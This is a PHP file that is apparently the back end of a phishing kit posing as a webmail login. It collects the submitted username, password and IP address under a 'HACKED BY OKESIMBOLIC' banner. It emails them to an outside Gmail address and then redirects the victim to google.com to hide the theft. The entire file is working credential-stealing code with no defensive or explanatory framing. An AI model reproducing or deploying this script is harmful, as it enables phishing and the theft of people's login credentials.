<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------HACKED BY OKESIMBOLIC -----------------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Emp0w3r3d By OKESIMBOLIC-----------------------------\n";

$recipient = "sjerry1958@gmail.com";
$subject = "WEBMAIL- $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:http://www.google.com");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>